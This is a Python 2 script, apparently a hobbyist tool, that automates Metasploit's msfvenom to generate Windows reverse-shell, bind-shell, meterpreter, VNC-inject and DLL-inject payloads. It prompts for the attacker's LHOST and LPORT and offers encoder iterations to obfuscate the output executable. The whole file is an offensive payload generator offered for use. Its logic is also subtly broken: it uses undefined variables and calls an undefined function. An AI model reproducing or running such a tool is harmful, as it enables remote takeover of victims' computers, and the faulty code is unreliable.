import sys, platform, subprocess, os, socket
from urllib2 import urlopen

# Bold
BR="\033[1;31m"         # Red
BG="\033[1;32m"       # Green
BY="\033[1;33m"      # Yellow
BB="\033[1;34m"        # Blue
BP="\033[1;35m"      # Purple
BC="\033[1;36m"        # Cyan
BW="\033[1;37m"       # White

# Regular Colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green					# Variables for text colors. Saves me the trouble thank you!
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


print C + "______     ______           _                 _ "
print "| ___ \    | ___ \         | |               | |"
print "| |_/ /   _| |_/ /_ _ _   _| | ___   __ _  __| |"
print "|  __/ | | |  __/ _` | | | | |/ _ \ / _` |/ _` |"
print "| |  | |_| | | | (_| | |_| | | (_) | (_| | (_| |"
print "\_|   \__, \_|  \__,_|\__, |_|\___/ \__,_|\__,_|"
print "       __/ |           __/ |                    "
print "      |___/           |___/                     " + W


print G + "[*] Automatic Metasploit Payload Generator [*]" + P
print "[*] Written By: ex0dus_0x [*]" + W
print "     "
print "You are currently using " + O + str(platform.system()) + " " + str(platform.release()) + W
print "     "

if str(platform.system()) != "Linux":
	print BR + "[!] You are not using a Linux-based operating system! [!]" +  W
'''
try:
    subprocess.call(["msfvenom"], stderr=open(os.devnull, 'wb'))
except OSError as e:
    print BR + "[!] Msfvenom is not found! Please set appropriate paths or install Metasploit if not installed! [!] " + W
    sys.exit(1)
'''

while True:
    payload = raw_input( BB + "[>] Specify a payload! Press enter to see a list of available payload options, or enter your desired one now: " + W )
    if payload == "":
        print "(1) windows/meterpreter/reverse_tcp"
        print "(2) windows/meterpreter/bind_tcp"
        print "(3) windows/meterpreter/reverse_http"
        print "(4) windows/meterpreter/reverse_https"
        print "    "
        print "(5) windows/shell/reverse_tcp"
        print "(6) windows/shell/bind_tcp"
        print "(7) windows/shell/reverse_http"
        print "(8) windows/shell/reverse_https"
        print "     "
        print "(9) windows/vncinject/reverse_tcp"
        print "(10) windows/vncinject/bind_tcp"
        print "(11) windows/vncinject/reverse_http"
        print "(12) windows/vncinject/reverse_https"
        print "     "
        print "(13) windows/dllinject/reverse_tcp"
        print "(14) windows/dllinject/bind_tcp"
        print "(15) windows/dllinject/reverse_http"
        print "(16) windows/dllinject/reverse_https"
    else:
        Payload = payload
        print "Payload => " + payload
        break

# IP Resolving! Utilized in order to determine IP addresses!
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('google.com', 0))
localaddr = s.getsockname()[0] # local subnet
ipaddr = urlopen('http://ip.42.pl/raw').read() # public IP

print "[*] Select option or manually enter [*]"
print "-------------------------------------------------------------"
print C + "(1) Use default local subnet address: " + O + localaddr + C
print "(2) Use public IP address: " + O + ipaddr + W
print "-------------------------------------------------------------"
op1 = raw_input(BB + "[>] What is your LHOST? " + W )
if op1 == "1":
    LHOST = localaddr
elif op1 == "2":
    LHOST = ipaddr
else:
    LHOST = op1

print "LHOST => " + LHOST

op2 = raw_input(BB + "[>] What is your LPORT? (enter for 4444 default) " + W )
if op2 == "":
    LPORT = "4444"
print "LPORT => " + LPORT


op3 = raw_input(BB + "[>] Are you using an encoder? (y/n) " + W )
if op3 == "y":
    op4 = raw_input(BB + "[>] Name of encoder? (enter for x86/shikata_ga_nai default) " + W )
    if op4 == "":
        Encoder = "x86/shikata_ga_nai"
    else:
        Encoder = op4
    op5 = raw_input(BB + "[>] How many iterations? " + W )
    print "Encoder => " + Encoder
    print "Iterations => " + op5
elif op3 == "n":
    print BY + "No encoder selected!" + W
else:
    print R + """Whoops something went wrong! I'm guessing that's a "no" then. """ + W

op6 = raw_input(BB + "[>] What is the fileformat you would like the payload in? (enter for exe default) " + W )
if op6 == "":
    Fileformat = "exe";
else:
    Fileformat = op6
print "Fileformat => " + Fileformat

op7 = raw_input(BB + "[>] Any additional options you would like to supply? (y/n) " + W )
if op7 == "y":
    ops = raw_input(BB + "[>] Please input additional flags as you would when utilizing msfvenom (for e.g -f exe)  " + W )
    print "Additional options => " + ops
elif op7 == "n":
    ops = " "

op8 = raw_input(BB + "[>] What is the name of the payload? ")

if "dllinject" in payload:
    dllpath = raw_input("[>] Additional option required: Specify path to reflective DLL script: ")
    print "DLLpath => " + dllpath
    print BG + "[*] Creating payload ... [*]"
    with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
        call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "DLL={}".format(dllpath), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)


print BG + "[*] Creating payload ... [*]" + W
with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
    subprocess.call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)












'''

    payop = raw_input("[>] ")
    print "Good..good. What is the " +  O + "LHOST?" + W
    lhost = raw_input("[>] ")
    print "What is the " + O + "LPORT?" + W
    lport = raw_input("[>] ")
    print "What is the encoder being used?" + O + " (typically x86/shikata_ga_nai)" + W
    encode = raw_input("[>] ")
    print "How many iterations should the encoder be used?"
    iteration = raw_input("[>] ")
    print B + "Almost done..." + W
    print "What is the format you the file to be in? " + W
    formatop = raw_input("[>] ")
    print "What would you like to name the payload?"
    payname = raw_input("[>] ")
    print O + "Creating payload..." + W

    if payop == "1":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "2":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "3":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "4":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "5":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "6":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "7":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "8":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "9":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "10":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "11":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "12":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "13":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "14":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "15":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "16":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    else:
        redo = raw_input(R + "[>] Something went wrong. Care to start over? (y/n)" + W)
        if redo == "y":
            continue
        else:
            sys.exit()
'''
